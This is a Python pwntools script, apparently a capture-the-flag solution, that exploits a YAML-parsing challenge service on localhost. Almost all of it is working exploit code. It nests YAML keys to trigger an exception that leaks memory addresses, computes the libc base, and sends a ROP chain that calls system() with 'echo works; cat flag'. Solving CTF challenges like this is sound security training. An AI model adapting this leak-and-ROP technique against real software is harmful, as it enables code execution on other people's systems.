#!/usr/bin/env python3
"""
file: pwn_template.py
author: Fabio Zoratti @orsobruno96 <fabio.zoratti96@gmail.com>

"""
from base64 import b64encode

from pwn import (
    ELF, context, args, gdb, remote, process, log,
    fit, ROP, p64, u64, p32, u32, flat, cyclic, shellcraft, asm, ui,
    disasm,
)
from yaml import dump


libyap = context.binary = ELF("binaries-debian/yap.cpython-312-x86_64-linux-gnu.so")
libc = ELF("binaries-debian/libc-2.31.so")

remotehost = ("localhost", 1337)


def start(argv=[], *a, **kw):
    return remote(*remotehost, *a, **kw)


def menu(io, choice: int):
    return io.sendlineafter(b"yaml\n> ", f"{choice}".encode())


def write_yaml(io, content):
    menu(io, 1)
    io.sendlineafter(b"one line", b64encode(dump(content, indent=1).encode()))
    io.recvuntil(b"saved in ")
    return io.recvline(False).decode()


def write_yaml_raw(io, content: bytes):
    menu(io, 1)
    io.sendlineafter(b"one line", b64encode(content))
    io.recvuntil(b"saved in ")
    return io.recvline(False).decode()


def load_yaml(io, fname: str):
    menu(io, 2)
    io.sendlineafter(b"File name? ", fname.encode())


def print_yaml(io, fname: str):
    menu(io, 3)
    io.sendlineafter(b"File name? ", fname.encode())


def trigger_exception_leak1(io):
    obj = {}
    cur = obj
    key = "system"
    for layer in range(130):
        cur[key] = {}
        cur = cur[key]
    cur[key] = None
    fname = write_yaml(io, obj)
    load_yaml(io, fname)

    io.recvuntil(b"DEBUG: exception triggered at ")
    so_leak = int(io.recvline(False).decode(), 0)
    io.recvuntil(b"Imported module: 'os' at ")
    os_module_addr = int(io.recvline(False).decode(), 0)

    io.recvuntil(b"ctx (")
    stack_leak = int(io.recvuntil(b")", drop=True).decode(), 0)
    io.recvuntil(b"object = ")
    heap_leak = int(io.recvuntil(b",", drop=True).decode(), 0)
    io.recvuntil(b"last_key = ")
    system_pyobject_addr = int(io.recvuntil(b"}", drop=True).decode(), 0)
    log.success(f"Leaked {so_leak = :#018x} {stack_leak = :#018x} {heap_leak = :#018x}")

    libyap.address = so_leak - (libyap.sym['match_level'] + 300)
    libc.address = libyap.address + 0x2d4000
    log.success(f"Leaked {libyap.address = :#018x} {libc.address = :#018x}")
    return stack_leak, os_module_addr, system_pyobject_addr


def trigger_exception_leak2(io):
    obj = {}
    cur = obj
    key = "cat flag.txt"
    for layer in range(130):
        cur[key] = {}
        cur = cur[key]
    cur[key] = None
    fname = write_yaml(io, obj)
    load_yaml(io, fname)
    io.recvuntil(b"last_key = ")
    catflag_pyobject_addr = int(io.recvuntil(b"}", drop=True).decode(), 0)
    return catflag_pyobject_addr


def solve_easy(io, gadg, stack_leak):
    stack_base = stack_leak + 0xe40
    payload = flat({
        0: b"echo works; cat flag\x00",
        0x20018: flat(
            gadg["NOP"],
            gadg["POP_RDI"],
            stack_base,
            libc.sym['system'],
        )
    })

    fname = write_yaml_raw(io, payload)
    load_yaml(io, fname)


def populate_gagdets():
    gadg = {}
    gadg["POP_RDI"] = 0x00000000000024b8 + libyap.address
    gadg["NOP"] = + gadg["POP_RDI"] + 1
    return gadg


def main():
    io = start(argv=["chall.py"])
    ui.pause()

    stack_leak, os_module_addr, system_pyobject_addr = trigger_exception_leak1(io)
    gadg = populate_gagdets()
    solve_easy(io, gadg, stack_leak)

    io.interactive()


if __name__ == "__main__":
    main()
